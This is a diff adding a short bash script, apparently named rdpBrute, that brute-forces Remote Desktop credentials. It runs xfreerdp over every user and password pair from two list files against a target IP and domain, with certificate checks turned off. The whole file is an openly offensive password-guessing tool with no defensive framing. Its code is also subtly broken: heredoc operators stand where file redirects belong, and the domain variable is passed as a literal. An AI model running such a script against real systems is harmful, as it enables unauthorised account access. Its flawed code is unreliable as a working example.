@@ -1,0 +1,18 @@
+#!/bin/bash
+
+if [ $# -ne 4 ]; then
+    echo  "Usage ./rdpBrute <IP> <USER.LST> <PASS.LST> <DOMAIN>"
+    exit
+fi
+
+ip="$1"
+userlist="$2"
+passlist="$3"
+domain="$4"
+
+while read u; do 
+    while read p; do 
+        echo "xfreerdp -authentication /cert:ignore /v:$ip /u:$u /p:$p /d:$domain"
+        xfreerdp -auth-only /cert:ignore /v:$ip /u:$u /p:$p /d:domain
+    done << $passlist
+done << $userlist
